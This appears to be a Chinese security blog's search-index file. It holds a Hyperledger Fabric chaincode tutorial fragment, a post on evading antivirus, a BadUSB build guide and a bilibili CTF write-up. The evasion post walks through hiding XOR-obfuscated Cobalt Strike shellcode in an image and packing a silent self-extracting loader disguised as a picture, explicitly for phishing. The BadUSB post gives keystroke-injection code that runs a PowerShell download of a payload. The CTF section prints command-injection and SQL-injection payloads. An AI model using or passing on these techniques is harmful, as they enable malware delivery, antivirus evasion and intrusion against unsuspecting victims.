class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --peerAddresses localhost:<span class="hljs-number">7051</span> --tlsRootCertFiles <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br></code></pre></td></tr></table></figure><p>可以使用peer lifecycle chaincode querycommitted命令来确认链码定义已提交给通道。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode querycommitted --channelID mychannel --name java_gateway_demo_1 --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><p>如果将链码成功提交给通道，该querycommitted命令将返回链码定义的顺序和版本:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Version:</span> <span class="hljs-number">1.0</span><span class="hljs-string">,</span> <span class="hljs-attr">Sequence:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">Endorsement Plugin:</span> <span class="hljs-string">escc,</span> <span class="hljs-attr">Validation Plugin:</span> <span class="hljs-string">vscc,</span> <span class="hljs-attr">Approvals:</span> [<span class="hljs-attr">Org1MSP:</span> <span class="hljs-literal">true</span>, <span class="hljs-attr">Org2MSP:</span> <span class="hljs-literal">true</span>]<br></code></pre></td></tr></table></figure><h2 id="5-调用链码"><a href="#5-调用链码" class="headerlink" title="5 调用链码"></a>5 调用链码</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer chaincode invoke -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem -C mychannel -n java_gateway_demo_1 --peerAddresses localhost:<span class="hljs-number">7051</span> --tlsRootCertFiles <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt -c <span class="hljs-string">&#x27;&#123;&quot;function&quot;:&quot;userRegister&quot;,&quot;Args&quot;:[&quot;test&quot; , &quot;test&quot;]&#125;&#x27;</span><br><br>peer chaincode query -C mychannel -n hyperledger-fabric-contract-java-demo -c <span class="hljs-string">&#x27;&#123;&quot;Args&quot;:[&quot;queryAsset&quot; , &quot;test&quot;]&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>看到 Chaincode invoke successful. result: status:200 信息证明链码调用成功:</p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chaincode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go_bypass</title>
    <link href="/2021/12/08/go-bypass/"/>
    <url>/2021/12/08/go-bypass/</url>
    
    <content type="html"><![CDATA[<p>实验室摸鱼之余找到了一篇基于go语言的一个免杀项目，于是手痒立刻上手试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs https://github.com/Hangingsword/HouQing">https://github.com/Hangingsword/HouQing<br></code></pre></td></tr></table></figure><p>该项目使用的是golang语言，可以快速生成exe可执行文件</p><p>下载完是两个文件：</p><p>​                <img src="/2021/12/08/go-bypass/image-20210927165424984.png" alt="image-20211208105743208"></p><p>其中code.go是用来生成加载了shellcode的图片，loader.go则是加载器。(原理类似与分离免杀</p><p>首先需要先打开code.go文件，修改如图的两个key值</p><img src="/2021/12/08/go-bypass/image-20210927165631535.png" alt="image-20210927165631535.png" style="zoom: 67%;"><p>其中code.go和Loader.go修改的值需要相同，然后通过cs生成一个java的shellcode</p><p>image-20210927170154557.png</p><p>然后将生成的shellcode放到code.go中进行一个xor混淆</p><p><img src="/2021/12/08/go-bypass/image-20210927170154557.png" alt="image-20210927170154557"></p><p>然后随便找一个图片进行shellcode注入（注入的时候记得关本地的杀毒要不然会报错），然后将注入成功后的图片放入服务器上，用python开一个http服务。</p><p><img src="/2021/12/08/go-bypass/image-20210927170629262.png" alt="image-20210927170629262"></p><p>再在加载器Loader.go中修改成自己服务器地址</p><img src="/2021/12/08/go-bypass/image-20210927170801795.png" alt="image-20210927170801795" style="zoom: 67%;"><p>在本地进行测试一下，成功上线</p><p><img src="/2021/12/08/go-bypass/image-20210927171155128.png" alt="image-20210927171155128"></p><p>此时我们可以用go对这个文件进行一个加工，通过执行命令让其生成一个可执行文件</p><figure class="highlight go"><figcaption><span>build -ldflags</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build -ldflags=<span class="hljs-string">&quot;-H windowsgui&quot;</span> Loader.<span class="hljs-keyword">go</span>  <span class="hljs-comment">//-ldflags=&quot;-H windowsgui&quot; 防止弹窗</span><br>尝试用<span class="hljs-keyword">go</span>将文件编译并带上图片但是发现再点击直接无法上线了，文件也被压缩了一半(太菜了原理还不太懂还得研究一下)，这个方法gg，换一个方法用自解压试试。<br></code></pre></td></tr></table></figure><p>使用Winrar把你需要的文件和免杀的马子一起打包，我这里用的是图片。</p><ul><li><p>首先选择自解压格式，然后–&gt;高级–&gt;自解压文件选项</p></li><li><p>解压路径随便设置这里设置的是c:/windows/temp</p></li><li><p>安装解压后运行:</p></li><li><pre><code>c:/windows/temp/test.jpg     c:/windows/temp/by_pass.exe</code></pre></li><li><p>模式–&gt;静默模式隐藏全部</p></li><li><p>更新–&gt;解压并更新文件和覆盖全部文件</p></li></ul><p><img src="/2021/12/08/go-bypass/image-20210927171733745.png" alt="image-20210927171733745"></p><p>生成好了之后在使用Resource Hacker将其图片替换一下就可以用来钓鱼了dddd</p><p>测试结果(亲测可以过火绒、defender、360)</p><p><img src="/2021/12/08/go-bypass/image-20210927172534445.png"></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Badusb</title>
    <link href="/2021/12/08/Badusb/"/>
    <url>/2021/12/08/Badusb/</url>
    
    <content type="html"><![CDATA[<p>Badusb制作</p><p>实验室摸鱼的时候没来由又想玩玩近源渗透所以就有了这篇文章，没什么技术含量单纯是好玩整活用的大佬勿喷。</p><h3 id="HID攻击原理"><a href="#HID攻击原理" class="headerlink" title="HID攻击原理"></a>HID攻击原理</h3><p>HID是Human Interface Device的缩写，是直接与人交互的设备，比如键盘、鼠标等等。攻击者可以将usb模拟成键盘，让电脑识别成为键盘，然后进行脚本模拟按键攻击。这种常用于近源渗透，可以配合社工一起使用。</p><p>HID攻击可以分为很多种，比如Teensy和USB Rubber ducky等等，这里使用的digispark。</p><h5 id="两种不同攻击的优势与劣势"><a href="#两种不同攻击的优势与劣势" class="headerlink" title="两种不同攻击的优势与劣势"></a>两种不同攻击的优势与劣势</h5><ul><li>橡皮鸭它最初作为一个IT自动化的POC，通过嵌入式开发板实现的。橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装能力，成功的成为了极客们必不可少的工具，十分的方便，但是价格不太便宜。HAK5网站上的大黄鸭更是动不动就几十美刀，不过其实有很多HACK5的工具完全可以自制。</li><li>Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程可以通过USB端口进行或者使用ISP接口进行编程的。多方便，而且它的体积就两个角硬币那么大，同时可以模拟多种硬件，还有多余的I/O口可以供极客们随意改装.它的价格也是十分的便宜.就20RMB就可以入手啦。</li></ul><p>使用不同的开发板，所写的代码和驱动都是不一样的，所以使用的时候需要看准自己购买的型号。</p><h5 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h5><p>1.直接淘宝购买一块digispark的开发板就可以直接使用了，如果想要美观欺骗性更强可以选择购买带usb壳的开发板。</p><p>2.(可有可无)公网vps可以用来挂http服务用来下载马子执行。</p><p>3.cs或者msf</p><p>4.Arduino用来烧录开发板</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">Arduino下载地址（国内论坛）https:<span class="hljs-regexp">//</span>www.arduino.cn/thread-<span class="hljs-number">5838</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>.html<br>Arduino官方下载地址https:<span class="hljs-regexp">//</span>www.arduino.cc<span class="hljs-regexp">/en/</span>Main/Software<br>下载的时候需要看清,digispark好像没有版本要求，但是Teensy的安装包是有对应的Arduino版本要求的<br></code></pre></td></tr></table></figure><p>下载完之后直接安装就可以，安装好之后在Arduino中加入对应的digispark开发板的支持(配置文件的下载需要翻墙,需要提前准备好梯子。)</p><h5 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h5><p>在文件–&gt;首选项中加入附加开发版管理</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>digistump.com/package_digistump_index.json<br></code></pre></td></tr></table></figure><p><img src="/2021/12/08/Badusb/image-20211024200506100.png" alt="image-20211024200506100"></p><p>在工具–&gt;开发板中打开开发板管理器，找到Digistump AVR Boards安装就可以(安装过程需要挂代理).</p><p><img src="/2021/12/08/Badusb/image-20211024200745515.png" alt="image-20211024200745515"></p><p>安装好之后就可以开始对digispark进行烧录程序了，可以直接在Arduino中编程了，开始默认有两个函数，一个setup()一个loop()，在插入开发板之后会执行一次setup()函数，然后循环loop()函数。其中代码是用的C语言</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">github一些开源的代码，只需要拿来稍微修改一下就可以用了<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hak5darren/</span>USB-Rubber-Ducky<span class="hljs-regexp">/wiki/</span>Payloads<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CedArctic/</span>DigiSpark-Scripts<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/digistump/</span>DigisparkArduinoIntegration<br></code></pre></td></tr></table></figure><p>example:</p><p><img src="/2021/12/08/Badusb/image-20211024201742845.png" alt="image-20211024201742845"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DigiKeyboard.h&quot;</span><br><br>void setup<span class="hljs-literal">()</span> &#123;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(0)</span>;<br><br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">3000</span>);<span class="hljs-comment">//延迟</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_R, MOD_GUI_LEFT)</span>;<span class="hljs-comment">//win+R键</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>println(<span class="hljs-string">&quot;cmd&quot;</span>);<span class="hljs-comment">//输入cmd</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<span class="hljs-comment">//回车</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>print(<span class="hljs-string">&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://localhost/bypass.exe&#x27;,&#x27;D:\\bypass.exe&#x27;);\&quot;&quot;</span>);<span class="hljs-comment">//执行的命令</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>println(<span class="hljs-string">&quot;D:\\Pictures.exe&quot;</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><br>&#125;<br><br>void loop<span class="hljs-literal">()</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>点了上传键之后在60s之内插入你的u盘可以直接烧录成功了。</p><p><img src="/2021/12/08/Badusb/image-20211024201939631.png" alt="image-20211024201939631"></p><p><del>谁插谁上线，用了都说好</del></p><p>除了powershell下载的思路其他思路就不用我多说了(可以结合前一篇文章的免杀一同食用效果更佳)，大师傅们肯定还有很多其他的骚操作dddd</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Badusb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bilibili_1024</title>
    <link href="/2021/10/24/bilibili-1024/"/>
    <url>/2021/10/24/bilibili-1024/</url>
    
    <content type="html"><![CDATA[<h2 id="bilibili-1024-CTF"><a href="#bilibili-1024-CTF" class="headerlink" title="bilibili 1024 CTF"></a>bilibili 1024 CTF</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1024</span>程序员节，大家一起和<span class="hljs-number">2233</span>参与解密游戏吧~<br>happy_<span class="hljs-number">1024_2233</span>:<br>e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf<span class="hljs-number">084d364</span><br><span class="hljs-number">0408</span>abca7deabb96a58f50471171b60e02b1a8dbd32db156<br></code></pre></td></tr></table></figure><p>看不懂解密直接一把梭，解密全试错了一遍，猜测happy_1024_2233应该是密钥，试了一下AES还是没解出来，后面又找了几个网站试了一下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">在线AES加密解密工具。AES采用对称分组密码体制，密钥长度支持为<span class="hljs-number">128</span><span class="hljs-regexp">/192/</span><span class="hljs-number">256</span>bits。用户密钥长度不足时，平台将以<span class="hljs-number">0</span>x00自动填充。IV也一样，自动填充，超出部分将被忽略。加密时会将明文数据按<span class="hljs-number">16</span><span class="hljs-keyword">byte</span>进行分组，不足<span class="hljs-number">16</span><span class="hljs-keyword">byte</span>时将用特定的Padding（如PCKS7）字符进填充，所以不同的Padding方式密文最后一段可能不一样。如果没有特别指明平台将使用UTF8编码处理数据（如KEY/IV）。<br></code></pre></td></tr></table></figure><p>所以直接用百度搜的平台没办法CV直接出结果，这时候删掉换行改输出为hex则可以直接得出结果（填充不影响结果的输出）</p><p><img src="/2021/10/24/bilibili-1024/image-20211025110201191.png" alt="image-20211025110201191"></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">某高级前端开发攻城狮更改了一个前端配置项<br>https:<span class="hljs-regexp">//</span>security.bilibili.com<span class="hljs-regexp">/sec1024/</span>q/<br></code></pre></td></tr></table></figure><p>打开发现是一个前端的页面直接F12大法看到一句提示Please enable JavaScript to continue.猜测可能是信息泄露，flag可能在js中，直接右键查看源码毛都没发现。</p><p><img src="/2021/10/24/bilibili-1024/image-20211025110505504.png" alt="image-20211025110505504"></p><p><del>首页看到用户名为test，猜测可能是越权，bp抓包看到token找了好久的token毛都没找到</del>。回到之前的想法信息泄露F12查看源代码意外中发现了一个webpack，之前看ChaMd5的文章有看到过这个信息泄露。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1400138</span><br></code></pre></td></tr></table></figure><p>直接在home.vue中找到flag</p><p><img src="/2021/10/24/bilibili-1024/image-20211025111331350.png" alt="image-20211025111331350"></p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">PHP <span class="hljs-keyword">is</span> the best <span class="hljs-keyword">language</span> <span class="hljs-keyword">for</span> web programming, but what about other languages?<br>http<span class="hljs-variable">s:</span>//security.bilibili.<span class="hljs-keyword">com</span>/sec1024/q/<span class="hljs-built_in">eval</span>.zip<br></code></pre></td></tr></table></figure><p>直接源码审计</p><ul><li>传入的参数count()之后要小于3</li><li>\w正则匹配0-9a-zA-Z</li><li>输入命令才会回显</li></ul><p>看到preg_match就知道是绕过preg了，直接百度搜一下<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_match绕过总结 </a>可以看到正则的结尾为$，所以可以直接用%0a进行绕过，$会忽略句尾的%0a，直接构造payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>    /* <br>        bilibili- ( ゜- ゜)つロ 乾杯~<br>        uat: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">3.2</span><span class="hljs-regexp">/uat/</span>eval.php<br>        pro: http:<span class="hljs-regexp">//</span>security.bilibili.com<span class="hljs-regexp">/sec1024/</span>q<span class="hljs-regexp">/pro/</span>eval.php<br>    */<br>    <span class="hljs-variable">$args</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (count(<span class="hljs-variable">$args</span>) &gt;<span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$args</span>); <span class="hljs-variable">$i</span>++ )&#123;  <br>        <span class="hljs-keyword">if</span> ( !preg_match(<span class="hljs-string">&#x27;/^\w+$/&#x27;</span>, <span class="hljs-variable">$args</span>[<span class="hljs-variable">$i</span>]) ) &#123;<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-regexp">//</span> todo: other filter<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;/bin/2233 &quot;</span> . implode(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$args</span>);<br>    exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$out</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$out</span>); <span class="hljs-variable">$i</span>++)&#123;<br>        echo(<span class="hljs-variable">$out</span>[<span class="hljs-variable">$i</span>]);<br>        echo(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>    &#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>构造payload为/sec1024/q/pro/eval.php?args[]=xxx%0a&amp;args[]=ls</p><p><img src="/2021/10/24/bilibili-1024/image-20211025112542540.png" alt="image-20211025112542540"></p><p>没有进行过滤直接cat读取得到flag</p><p><img src="/2021/10/24/bilibili-1024/image-20211025112704290.png" alt="image-20211025112704290"></p><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><p>和第二题的网址是一样的</p><p><del>毫无头绪找大佬py</del> 看到有人说是mysql盲注，有方向就好搞了</p><p><img src="/2021/10/24/bilibili-1024/image-20211025113905442.png" alt="image-20211025113905442"></p><p>首先找注入点，POST包是JSON格式的每个字符后面插单引号发现长度没变化所应该是数字型注入，首先判断注入点，参数user_name存在注入，这里过滤了空格（尝试用+发现也过滤了，这里使用的是内联注入），<del>掏出大宝贝直接一把梭</del></p><p><img src="/2021/10/24/bilibili-1024/image-20211025115451859.png" alt="image-20211025115451859"></p><p>gg?只能手工了，首先判断注入点</p><p><img src="/2021/10/24/bilibili-1024/image-20211025115706953.png" alt="image-20211025115706953"></p><p><img src="/2021/10/24/bilibili-1024/image-20211025115724910.png" alt="image-20211025115724910"></p><p>user_name存在注入，则order by判断一下存在5列，直接开始注入发现mysql版本为8.0.26，数据库名为q</p><p><img src="/2021/10/24/bilibili-1024/image-20211025120032728.png" alt="image-20211025120032728"></p><p>后面就是常规操作了先注入表名再列名最后找flag</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">111</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span>version(),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,group_concat(table_name)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/i</span>nformation_schema.tables<span class="hljs-regexp">/**/</span>where<span class="hljs-regexp">/**/</span>table_schema=database()<span class="hljs-comment">#</span><br><span class="hljs-string">&quot;111/**/union/**/select/**/version(),2,3,4,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;#&quot;</span><br>查flag的时候会发现没有回显这是因为单引号被过滤了考虑换成%<span class="hljs-number">27</span>来绕过发现不可以只能对flag进行十六进制转换绕过<br><span class="hljs-number">111</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span>version(),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,group_concat(id)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/</span>flag<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/24/bilibili-1024/image-20211025130555513.png" alt="image-20211025130555513"></p><p><img src="/2021/10/24/bilibili-1024/image-20211025131500092.png" alt="image-20211025131500092"></p><p><img src="/2021/10/24/bilibili-1024/image-20211025131639207.png" alt="image-20211025131639207"></p><h3 id="第五题、第六题"><a href="#第五题、第六题" class="headerlink" title="第五题、第六题"></a>第五题、第六题</h3><p>re涉及到知识盲区了，可以看看52上面大师傅的思路：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://www.<span class="hljs-number">52</span>pojie.cn/thread-<span class="hljs-number">1532779</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>.html<br></code></pre></td></tr></table></figure><p>第七题我是直接导到excel然后筛选去重的笨方法，拿不到所有的答案(呜呜呜还是太菜了)，网上有人写了脚本可以去搜一下忘记存链接了。</p><p>题目网址:<a href="https://security.bilibili.com/sec1024/">https://security.bilibili.com/sec1024/</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
